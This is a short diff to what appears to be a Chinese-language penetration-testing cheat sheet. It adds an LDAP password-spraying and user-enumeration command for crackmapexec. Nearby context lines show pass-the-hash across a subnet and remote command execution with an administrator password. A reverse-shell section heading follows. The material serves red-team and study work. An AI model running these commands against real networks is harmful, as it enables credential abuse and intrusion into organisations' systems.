@@ -1099,6 +1099,10 @@ proxychains4 ./cme smb 10.0.0.1/24 -u administrator -H 31d6cfe0d16ae931b73c59d7e
 ```
 crackmapexec smb 192.168.10.11 -u Administrator -p 'P@ssw0rd' -x whoami
 ```
+ldap喷洒
+```
+cme ldap 10.11.12.211 -u 'username' -p 'password' --kdcHost 10.11.12.211 --users
+```
 
 
 ## 反弹shell
